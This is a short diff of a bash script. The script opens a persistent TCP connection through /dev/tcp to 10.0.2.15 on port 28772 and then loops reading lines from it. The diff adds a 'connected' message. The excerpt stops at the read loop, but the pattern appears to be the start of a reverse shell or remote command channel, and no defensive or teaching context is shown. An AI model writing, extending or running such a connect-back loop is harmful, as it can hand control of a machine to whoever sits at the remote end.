@@ -1,7 +1,7 @@
 #!/bin/bash
 
 exec 3<>/dev/tcp/10.0.2.15/28772
-
+echo "connected"
 while true
 do
     read -r line
